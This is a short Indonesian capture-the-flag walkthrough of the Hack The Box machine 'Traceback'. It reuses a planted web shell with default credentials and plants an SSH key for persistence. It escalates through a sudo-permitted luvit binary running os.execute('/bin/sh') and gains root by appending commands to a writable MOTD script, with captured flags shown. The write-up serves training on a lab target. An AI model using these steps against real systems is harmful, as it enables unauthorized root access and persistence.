```
Enum, port 80 sama ssh
```

```
Cek webnya, cek source-code (CTRL+U)

<!--Some of the best web shells that you might need ;)-->

Kita googling aja dan cobain semua shell yang ada di https://github.com/TheBinitGhimire/Web-Shells

Dapet di http://10.10.10.181/smevk.php (admin:admin)

Upload revshell, trus jalanin di webnya atau wuvel@wuvel:~/Wuvel/CTF/HTB/Traceback$ ssh webadmin@10.10.10.181 -i ~/.ssh/id_rsa (upload id_rsa.pub kita ke .ssh sambil diubah namanya jadi authorized_keys)
```

```
webadmin@traceback:/home/webadmin/.ssh$ sudo -l
sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit

webadmin@traceback:/home/webadmin$ cat .bash_history
cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout

webadmin@traceback:/home/webadmin$ echo 'os.execute("/bin/sh")' > privesc.lua
echo 'os.execute("/bin/sh")' > privesc.lua

webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
.lua -u sysadmin /home/sysadmin/luvit privesc.
sh: turning off NDELAY mode
ls
note.txt
privesc.lua
whoami
sysadmin
```

```
sysadmin@traceback:~$ ls
ls
luvit
user.txt
sysadmin@traceback:~$ cat user.txt
cat user.txt
f4f7d1a701fb6da426083049b725b4ef
```

```
wuvel@wuvel:~/Wuvel/CTF/HTB/Traceback$ ssh webadmin@10.10.10.181 -i ~/.ssh/id_rsa

linpeas, dapet direktori menarik

sysadmin@traceback:/etc/update-motd.d$
```

```
sysadmin@traceback:/etc/update-motd.d$ ls -la
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  984 Jun 15 07:47 00-header
-rwxrwxr-x  1 root sysadmin  982 Jun 15 07:47 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Jun 15 07:47 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Jun 15 07:47 80-esm
-rwxrwxr-x  1 root sysadmin  299 Jun 15 07:47 91-release-upgrade

sysadmin@traceback:/etc/update-motd.d$ echo "cat /root/root.txt" >> 00-header 
sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
cat /root/root.txt
sysadmin@traceback:/etc/update-motd.d$
```

```
wuvel@wuvel:~$ ssh webadmin@10.10.10.181 -i .ssh/id_rsa
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

275e15322579f3970fac0d6d20304fb5


Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Jun 15 07:48:17 2020 from 10.10.14.15
webadmin@traceback:~$ 
```